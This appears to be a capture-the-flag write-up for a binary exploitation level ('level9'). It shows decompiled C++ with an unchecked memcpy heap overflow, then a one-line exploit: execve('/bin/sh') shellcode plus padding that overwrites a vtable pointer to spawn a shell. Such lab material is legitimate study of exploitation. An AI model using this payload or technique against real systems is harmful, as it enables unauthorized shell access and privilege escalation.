
/* N::setAnnotation(char*) */
// 0804870e
void __thiscall N::setAnnotation(N *this,char *param_1)

{
  size_t __n;
  
  __n = strlen(param_1);
  memcpy(this + 4,param_1,__n);
  return;
}



void main(int param_1,int param_2)

{
  N *this;
  undefined4 *this_00;
  
  if (param_1 < 2) {
                    /* WARNING: Subroutine does not return */
    _exit(1);
  }
  this = (N *)operator.new(0x6c);
  N::N(this,5);
  this_00 = (undefined4 *)operator.new(0x6c);
  N::N((N *)this_00,6);
  N::setAnnotation(this,*(char **)(param_2 + 4));
  (**(code **)*this_00)(this_00,this);
  return;
}



./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
$ whoami